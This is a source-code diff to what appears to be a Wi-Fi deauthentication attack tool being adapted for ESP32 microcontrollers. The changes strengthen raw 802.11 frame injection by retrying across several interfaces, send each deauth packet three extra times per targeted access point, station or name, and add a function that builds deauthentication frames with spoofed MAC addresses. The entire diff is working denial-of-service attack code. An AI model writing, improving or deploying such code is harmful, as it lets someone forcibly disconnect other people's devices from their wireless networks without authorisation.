@@ -224,6 +224,10 @@ void Attack::deauthUpdate() {
             if ((apCount > 0) && (deauth.tc < apCount)) {
                 if (accesspoints.getSelected(deauth.tc)) {
                     deauth.tc += deauthAP(deauth.tc);
+                    // Send multiple packets per AP for ESP32
+                    #ifdef ESP32
+                    for (int i = 0; i < 3; i++) deauthAP(deauth.tc - 1);
+                    #endif
                 } else deauth.tc++;
             }
 
@@ -231,6 +235,10 @@ void Attack::deauthUpdate() {
             else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                 if (stations.getSelected(deauth.tc - apCount)) {
                     deauth.tc += deauthStation(deauth.tc - apCount);
+                    // Send multiple packets per station for ESP32
+                    #ifdef ESP32
+                    for (int i = 0; i < 3; i++) deauthStation(deauth.tc - apCount - 1);
+                    #endif
                 } else deauth.tc++;
             }
 
@@ -238,6 +246,9 @@ void Attack::deauthUpdate() {
             else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                 if (names.getSelected(deauth.tc - stCount - apCount)) {
                     deauth.tc += deauthName(deauth.tc - stCount - apCount);
+                    #ifdef ESP32
+                    for (int i = 0; i < 3; i++) deauthName(deauth.tc - stCount - apCount - 1);
+                    #endif
                 } else deauth.tc++;
             }
 
@@ -462,15 +473,33 @@ bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
 }
 
 bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
-    // Serial.println(bytesToStr(packet, packetSize));
-
-    // set channel
     setWifiChannel(ch, force_ch);
 
-    // sent out packet
     bool sent = false;
 #ifdef ESP32
-    sent = esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false) == ESP_OK;
+    // ESP32 raw packet injection - try all interfaces
+    // Method 1: STA interface
+    if (esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false) == ESP_OK) {
+        sent = true;
+    }
+    // Method 2: AP interface  
+    else if (esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false) == ESP_OK) {
+        sent = true;
+    }
+    // Method 3: With en_sys_seq parameter (some firmwares support this)
+    else if (esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, true) == ESP_OK) {
+        sent = true;
+    }
+    // Method 4: Try multiple times with slight delays
+    else {
+        for (int retry = 0; retry < 3; retry++) {
+            if (esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false) == ESP_OK) {
+                sent = true;
+                break;
+            }
+            delayMicroseconds(100);
+        }
+    }
 #else
     sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
 #endif
@@ -478,6 +507,26 @@ bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool f
     if (sent) ++tmpPacketRate;
 
     return sent;
+}
+
+bool Attack::sendDeauthFrame(uint8_t* targetMac, uint8_t* apMac, uint8_t reason) {
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00,                         // Type: Deauth
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Fragment/Sequence
+        0x01, 0x00                          // Reason: Unspecified
+    };
+    
+    // Copy MAC addresses
+    if (targetMac) memcpy(&deauthPacket[4], targetMac, 6);
+    if (apMac) memcpy(&deauthPacket[10], apMac, 6);
+    memcpy(&deauthPacket[16], apMac ? apMac : targetMac, 6);
+    deauthPacket[24] = reason;
+    
+    return sendPacket(deauthPacket, 26, wifi_channel, true);
 }
 
 void Attack::enableOutput() {
